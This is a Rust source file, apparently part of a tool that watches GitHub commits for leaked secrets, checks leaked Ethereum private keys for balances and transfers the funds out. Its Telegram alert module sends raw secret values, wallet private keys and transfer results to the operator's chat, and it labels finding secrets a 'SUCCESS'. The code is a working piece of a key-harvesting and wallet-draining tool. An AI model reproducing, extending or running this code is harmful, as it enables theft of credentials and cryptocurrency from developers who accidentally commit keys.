use crate::config::Config;
use crate::models::wallet::{TransferResult, WalletInfo};
use teloxide::prelude::*;
use teloxide::types::ParseMode;
use std::sync::Arc;
use chrono::Utc;
use tracing::{info, warn};

pub struct TelegramAlerts {
    bot: Bot,
    chat_id: ChatId,
}

impl TelegramAlerts {
    pub fn new(config: Arc<Config>) -> Result<Self, Box<dyn std::error::Error>> {
        let bot = Bot::new(config.telegram_bot_token.clone());
        let chat_id = ChatId(config.telegram_chat_id.parse()?);
        
        Ok(Self { bot, chat_id })
    }
    
    pub fn new_optional(config: Arc<Config>) -> Arc<Self> {
        match Self::new(config) {
            Ok(ta) => {
                info!("✅ Telegram alerts initialized");
                Arc::new(ta)
            }
            Err(e) => {
                warn!("⚠️ Telegram init failed: {} — using dummy", e);
                Arc::new(Self {
                    bot: Bot::new("dummy_token"),
                    chat_id: ChatId(0),
                })
            }
        }
    }
    
    // 🆕 Naya Method: Scan Status Report
    pub async fn send_scan_status(
        &self,
        repo: &str,
        total_files: usize,
        scanned_files: usize,
        skipped_files: usize,
        secrets_found: usize,
        commit_sha: &str,
    ) {
        if self.chat_id.0 == 0 {
            return; // Dummy mode
        }
        
        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        
        let message = format!(
            "📊 SCAN STATUS REPORT\n\
             ─────────────────────\n\
             🕐 Time: {}\n\
             📦 Repo: {}\n\
             🔖 Commit: {}\n\
             ─────────────────────\n\
             📄 Total files: {}\n\
             ✅ Scanned: {}\n\
             ⏭️ Skipped: {}\n\
             🔑 Secrets found: {}\n\
             ─────────────────────\n\
             Status: {}\n",
            timestamp,
            repo,
            commit_sha,
            total_files,
            scanned_files,
            skipped_files,
            secrets_found,
            if secrets_found > 0 { "🟢 SUCCESS" } else { "🟡 NO SECRETS" }
        );
        
        self.send_message(&message).await;
    }
    
    // 🆕 Naya Method: Scan Error Alert
    pub async fn send_scan_error(
        &self,
        repo: &str,
        file_name: &str,
        error_type: &str,
        error_detail: &str,
    ) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        
        let message = format!(
            "⚠️ SCAN ERROR!\n\
             ─────────────────────\n\
             🕐 Time: {}\n\
             📦 Repo: {}\n\
             📄 File: {}\n\
             ❌ Error: {}\n\
             📝 Detail: {}\n",
            timestamp,
            repo,
            file_name,
            error_type,
            error_detail
        );
        
        self.send_message(&message).await;
    }
    
    // 🆕 Naya Method: Health Check
    pub async fn send_health_check(&self) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        
        let message = format!(
            "💓 HEALTH CHECK\n\
             ─────────────────────\n\
             🕐 Time: {}\n\
             ✅ Scanner is running\n\
             🔄 Monitoring GitHub events...\n",
            timestamp
        );
        
        self.send_message(&message).await;
    }
    
    // 🆕 Naya Method: File Skip Warning
    pub async fn send_file_skipped(
        &self,
        repo: &str,
        file_name: &str,
        reason: &str,
    ) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let message = format!(
            "⏭️ FILE SKIPPED\n\
             ─────────────────────\n\
             📦 Repo: {}\n\
             📄 File: {}\n\
             ❓ Reason: {}\n",
            repo,
            file_name,
            reason
        );
        
        self.send_message(&message).await;
    }
    
    pub async fn send_secret_found(
        &self,
        repo: &str,
        commit_sha: &str,
        file_path: &str,
        secret_type: &str,
        secret_value: &str,
    ) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let message = format!(
            "🚨 SECRET FOUND!\nRepo: {}\nCommit: {}\nFile: {}\nType: {}\nSecret: `{}`",
            repo, commit_sha, file_path, secret_type, secret_value
        );
        
        self.send_message(&message).await;
    }
    
    pub async fn send_balance_detected(&self, wallet_info: &WalletInfo) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let message = format!(
            "💰 BALANCE DETECTED!\nAddress: {}\nBalance: {} ETH\nKey: `{}`",
            wallet_info.address, wallet_info.balance, wallet_info.private_key
        );
        
        self.send_message(&message).await;
    }
    
    pub async fn send_transfer_success(&self, wallet_info: &WalletInfo, transfer: &TransferResult) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let message = format!(
            "✅ TRANSFER SUCCESS!\nFrom: {}\nTo: {}\nAmount: {} ETH\nTx: `{}`",
            transfer.from_address, transfer.to_address, transfer.amount, transfer.tx_hash
        );
        
        self.send_message(&message).await;
    }
    
    pub async fn send_transfer_failed(&self, wallet_info: &WalletInfo, error: &str) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let message = format!(
            "❌ TRANSFER FAILED!\nAddress: {}\nError: {}\nKey: `{}`",
            wallet_info.address, error, wallet_info.private_key
        );
        
        self.send_message(&message).await;
    }
    
    async fn send_message(&self, message: &str) {
        match self.bot
            .send_message(self.chat_id, message)
            .await
        {
            Ok(_) => info!("✅ Telegram alert sent"),
            Err(e) => warn!("❌ Telegram send failed: {}", e),
        }
    }
}